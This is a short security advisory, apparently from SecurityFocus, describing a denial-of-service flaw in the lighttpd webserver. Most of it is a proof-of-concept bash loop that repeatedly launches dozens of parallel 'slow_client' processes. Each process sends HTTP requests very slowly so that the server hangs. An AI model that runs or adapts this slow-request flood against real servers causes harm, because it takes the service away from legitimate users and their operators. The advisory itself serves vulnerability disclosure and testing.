source: http://www.securityfocus.com/bid/38036/info

The 'lighttpd' webserver is prone to a denial-of-service vulnerability.

Remote attackers can exploit this issue to cause the application to hang, denying service to legitimate users. 

##slow_test.sh
for ((j=0;j<1000;j++)) do
  for ((i=0; i<50; i++)) do
  ## slow_client is a C program which sends a HTTP request very slowly
    ./slow_client http://www.example.com/>/dev/null 2>/dev/null &
  done&
  sleep 3
done